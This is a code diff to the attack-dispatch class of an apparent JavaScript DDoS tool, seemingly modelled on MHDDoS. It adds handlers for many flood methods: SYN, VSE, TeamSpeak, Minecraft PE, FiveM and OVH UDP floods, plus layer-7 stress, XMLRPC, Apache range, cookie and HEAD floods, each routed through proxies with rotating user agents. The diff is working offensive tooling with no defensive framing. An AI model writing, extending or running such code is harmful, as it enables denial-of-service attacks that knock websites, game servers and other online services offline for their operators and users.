@@ -3,7 +3,21 @@ import { Tools } from '../utils/tools.js';
 import { logger } from '../utils/logger.js';
 
 // Layer 4 Methods
-import { UDPFlood, TCPFlood, MinecraftFlood, MinecraftBot } from '../methods/layer4/index.js';
+import { 
+    UDPFlood, 
+    TCPFlood, 
+    MinecraftFlood, 
+    MinecraftBot,
+    SYNFlood,
+    VSEFlood,
+    TS3Flood,
+    MCPEFlood,
+    FiveMFlood,
+    FiveMTokenFlood,
+    CPSFlood,
+    ConnectionFlood,
+    OVHUDPFlood
+} from '../methods/layer4/index.js';
 
 // Layer 7 Methods
 import { 
@@ -23,6 +37,15 @@ import {
     AdvancedBypass, 
     BotSimulation 
 } from '../methods/layer7/bypass.js';
+
+import {
+    StressAttack,
+    NullAttack,
+    DynamicAttack,
+    XMLRPCAttack,
+    ApacheRangeAttack,
+    CookieAttack
+} from '../methods/layer7/advanced.js';
 
 /**
  * Attack Manager - Coordinates all attack operations
@@ -109,6 +132,51 @@ export class AttackManager {
             return new MinecraftBot(host, port, this.duration, 47, 'MHDDoS_');
         }
 
+        if (['SYN'].includes(method)) {
+            const [host, port] = this.parseTarget();
+            return new SYNFlood(host, port, this.duration, this.proxies);
+        }
+
+        if (['VSE'].includes(method)) {
+            const [host, port] = this.parseTarget();
+            return new VSEFlood(host, port, this.duration, this.proxies);
+        }
+
+        if (['TS3'].includes(method)) {
+            const [host, port] = this.parseTarget();
+            return new TS3Flood(host, port, this.duration, this.proxies);
+        }
+
+        if (['MCPE'].includes(method)) {
+            const [host, port] = this.parseTarget();
+            return new MCPEFlood(host, port, this.duration, this.proxies);
+        }
+
+        if (['FIVEM'].includes(method)) {
+            const [host, port] = this.parseTarget();
+            return new FiveMFlood(host, port, this.duration, this.proxies);
+        }
+
+        if (['FIVEM-TOKEN'].includes(method)) {
+            const [host, port] = this.parseTarget();
+            return new FiveMTokenFlood(host, port, this.duration, this.proxies);
+        }
+
+        if (['CPS'].includes(method)) {
+            const [host, port] = this.parseTarget();
+            return new CPSFlood(host, port, this.duration, this.proxies);
+        }
+
+        if (['CONNECTION'].includes(method)) {
+            const [host, port] = this.parseTarget();
+            return new ConnectionFlood(host, port, this.duration, this.proxies);
+        }
+
+        if (['OVH-UDP'].includes(method)) {
+            const [host, port] = this.parseTarget();
+            return new OVHUDPFlood(host, port, this.duration, this.proxies);
+        }
+
         // Layer 7 Methods
         if (['GET'].includes(method)) {
             return new HTTPGetFlood(
@@ -190,6 +258,87 @@ export class AttackManager {
                 this.duration, 
                 this.rpc
             );
+        }
+
+        if (['STRESS'].includes(method)) {
+            return new StressAttack(
+                this.target,
+                this.duration,
+                this.rpc,
+                this.userAgents,
+                this.referers,
+                this.proxies
+            );
+        }
+
+        if (['NULL'].includes(method)) {
+            return new NullAttack(
+                this.target,
+                this.duration,
+                this.rpc,
+                this.userAgents,
+                this.referers,
+                this.proxies
+            );
+        }
+
+        if (['DYN'].includes(method)) {
+            return new DynamicAttack(
+                this.target,
+                this.duration,
+                this.rpc,
+                this.userAgents,
+                this.referers,
+                this.proxies
+            );
+        }
+
+        if (['XMLRPC'].includes(method)) {
+            return new XMLRPCAttack(
+                this.target,
+                this.duration,
+                this.rpc,
+                this.userAgents,
+                this.referers,
+                this.proxies
+            );
+        }
+
+        if (['APACHE'].includes(method)) {
+            return new ApacheRangeAttack(
+                this.target,
+                this.duration,
+                this.rpc,
+                this.userAgents,
+                this.referers,
+                this.proxies
+            );
+        }
+
+        if (['COOKIE'].includes(method)) {
+            return new CookieAttack(
+                this.target,
+                this.duration,
+                this.rpc,
+                this.userAgents,
+                this.referers,
+                this.proxies
+            );
+        }
+
+        if (['HEAD'].includes(method)) {
+            // HEAD method can use GET flood with method override
+            const attack = new HTTPGetFlood(
+                this.target,
+                this.duration,
+                this.rpc,
+                this.userAgents,
+                this.referers,
+                this.proxies
+            );
+            // Override method in the attack class
+            attack.httpMethod = 'HEAD';
+            return attack;
         }
 
         logger.error(`Unknown method: ${method}`);
